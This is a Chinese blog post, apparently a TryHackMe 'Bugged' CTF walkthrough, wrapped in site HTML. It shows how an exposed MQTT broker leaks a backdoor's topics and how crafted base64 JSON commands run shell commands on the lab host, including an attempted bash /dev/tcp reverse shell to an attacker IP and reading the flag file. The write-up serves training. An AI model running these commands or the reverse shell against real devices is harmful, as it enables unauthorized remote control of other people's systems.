@@ -1,0 +1,311 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Bugged | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Bugged John likes to live in a very Internet connected world. Maybe too connected…  端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.145.162.207 22 SSH 10.145.162.207:22  OpenSSH 8.2p1 Ubuntu 4ubun">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Bugged">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/6adba24.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="Bugged John likes to live in a very Internet connected world. Maybe too connected…  端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.145.162.207 22 SSH 10.145.162.207:22  OpenSSH 8.2p1 Ubuntu 4ubun">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-14T11:51:29.000Z">
+<meta property="article:modified_time" content="2026-05-15T05:03:35.717Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/6adba24.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Bugged',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-15 13:03:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Bugged</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-14T11:51:29.000Z" title="发表于 2026-05-14 19:51:29">2026-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-15T05:03:35.717Z" title="更新于 2026-05-15 13:03:35">2026-05-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">878</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Bugged"><a href="#Bugged" class="headerlink" title="Bugged"></a>Bugged</h1><blockquote>
+<p>John likes to live in a very Internet connected world. Maybe too connected…</p>
+</blockquote>
+<p>端口扫描</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="center">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">10.145.162.207</td>
+<td align="center">22</td>
+<td align="left">SSH</td>
+<td align="left">10.145.162.207:22</td>
+<td align="left"></td>
+<td align="left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">10.145.162.207</td>
+<td align="center">1883</td>
+<td align="left">MQTT</td>
+<td align="left">10.145.162.207:1883</td>
+<td align="left"></td>
+<td align="left">UnKnown</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<p><code>MQTT</code> 是物联网常用的消息协议，可以使用 <code>mosquitto-clients</code> 工具来连接</p>
+<p>安装</p>
+<pre class="line-numbers language-none"><code class="language-none">apt install mosquitto-clients<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>尝试连接并订阅所有主题</p>
+<p>这里有一条重复消息，它很可能是 <code>IoT</code> 设备用于接收命令的控制主题</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# mosquitto_sub -h 10.145.162.207 -p 1883 -t &quot;#&quot; -v
+...
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ&#x3D;&#x3D;
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>解码</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+  &quot;id&quot;: &quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,
+  &quot;registered_commands&quot;: [&quot;HELP&quot;, &quot;CMD&quot;, &quot;SYS&quot;],
+  &quot;pub_topic&quot;: &quot;U4vyqNlQtf&#x2F;0vozmaZyLT&#x2F;15H9TF6CHg&#x2F;pub&quot;,
+  &quot;sub_topic&quot;: &quot;XD2rfR9Bez&#x2F;GqMpRSEobh&#x2F;TvLQehMg0E&#x2F;sub&quot;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试对  <code>U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub</code> 和 <code>XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub</code> 发送消息</p>
+<pre class="line-numbers language-none"><code class="language-none">mosquitto_pub -h 10.145.162.207 -p 1883 -t &quot;XD2rfR9Bez&#x2F;GqMpRSEobh&#x2F;TvLQehMg0E&#x2F;sub&quot; -m &#39;&#123;&quot;cmd&quot;:&quot;HELP&quot;&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>第一个没收到消息，第二个收到了消息</p>
+<pre class="line-numbers language-none"><code class="language-none">U4vyqNlQtf&#x2F;0vozmaZyLT&#x2F;15H9TF6CHg&#x2F;pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>解码后提示格式错误</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# echo &quot;SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk&#x3D;&quot; | base64 -d
+Invalid message format.
+Format: base64(&#123;&quot;id&quot;: &quot;&lt;backdoor id&gt;&quot;, &quot;cmd&quot;: &quot;&lt;command&gt;&quot;, &quot;arg&quot;: &quot;&lt;argument&gt;&quot;&#125;)                                                                                                                                  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造 <code>json</code> 消息，并进行 <code>base64</code> 编码</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;id&quot;: &quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;, &quot;cmd&quot;: &quot;HELP&quot;, &quot;arg&quot;: &quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>再次发送命令</p>
+<pre class="line-numbers language-none"><code class="language-none">mosquitto_pub -h 10.145.162.207 -p 1883 -t &quot;XD2rfR9Bez&#x2F;GqMpRSEobh&#x2F;TvLQehMg0E&#x2F;sub&quot;  -m &#39;eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>对收到的消息解码，的确可以执行 <code>help</code> 命令</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# echo &quot;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ&#x3D;&#x3D;&quot; | base64 -d
+&#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;response&quot;:&quot;Message format:\n    Base64(&#123;\n        \&quot;id\&quot;: \&quot;&lt;Backdoor ID&gt;\&quot;,\n        \&quot;cmd\&quot;: \&quot;&lt;Command&gt;\&quot;,\n        \&quot;arg\&quot;: \&quot;&lt;arg&gt;\&quot;,\n    &#125;)\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n&quot;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">HELP</td>
+<td align="left">显示帮助信息</td>
+</tr>
+<tr>
+<td align="left">CMD</td>
+<td align="left">执行系统命令（需要 arg 参数）</td>
+</tr>
+<tr>
+<td align="left">SYS</td>
+<td align="left">返回系统信息</td>
+</tr>
+</tbody></table>
+<p>尝试使用 <code>CMD</code> 执行 <code>id</code> 命令</p>
+<p>构造 <code>json</code> 格式并编码</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;id&quot;: &quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;, &quot;cmd&quot;: &quot;CMD&quot;, &quot;arg&quot;: &quot;id&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功返回当前用户</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# echo &quot;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidWlkPTEwMDAoY2hhbGxlbmdlKSBnaWQ9MTAwMChjaGFsbGVuZ2UpIGdyb3Vwcz0xMDAwKGNoYWxsZW5nZSlcbiJ9&quot; | base64 -d
+&#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;response&quot;:&quot;uid&#x3D;1000(challenge) gid&#x3D;1000(challenge) groups&#x3D;1000(challenge)\n&quot;&#125;             <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试反弹 <code>shell</code></p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;id&quot;: &quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;, &quot;cmd&quot;: &quot;CMD&quot;, &quot;arg&quot;: &quot;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.140.133&#x2F;4444 0&gt;&amp;1\&quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回网络连接错误</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# echo &quot;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiYmFzaDogY29ubmVjdDogTmV0d29yayBpcyB1bnJlYWNoYWJsZVxuYmFzaDogbGluZSAxOiAvZGV2L3RjcC8xOTIuMTY4LjE0MC4xMzMvNDQ0NDogTmV0d29yayBpcyB1bnJlYWNoYWJsZVxuIn0&#x3D;&quot; | base64 -d
+&#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;response&quot;:&quot;bash: connect: Network is unreachable\nbash: line 1: &#x2F;dev&#x2F;tcp&#x2F;192.168.140.133&#x2F;4444: Network is unreachable\n&quot;&#125;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>既然不能反弹，那就直接寻找文件位置</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;id&quot;: &quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;, &quot;cmd&quot;: &quot;CMD&quot;, &quot;arg&quot;: &quot;ls&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>flag.txt</code> 就在当前目录</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# echo &quot;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9&quot; | base64 -d
+&#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;response&quot;:&quot;flag.txt\n&quot;&#125;   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>查看文件</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;id&quot;: &quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;, &quot;cmd&quot;: &quot;CMD&quot;, &quot;arg&quot;: &quot;cat flag.txt&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到 <code>flag</code></p>
+<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~&#x2F;桌面]
+└─# echo &quot;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9&quot; | base64 -d
+&#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;response&quot;:&quot;flag&#123;18d44fc0707ac8dc8be45bb83db54013&#125;\n&quot;&#125;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/6adba24.html">https://x9wd09ncc.github.io/post/6adba24.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/f4c9fbf.html" title="TryHackMe_合集1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_合集1</div></div></a></div><div class="next-post pull-right"><a href="/post/4a800b0.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_CyberHeroes</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/4a800b0.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/f4c9fbf.html" title="TryHackMe_合集1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_合集1</div></div></a></div><div><a href="/post/b3d8cfd2.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/3401368e.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/a72569f1.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/6c602f0e.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Creative</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
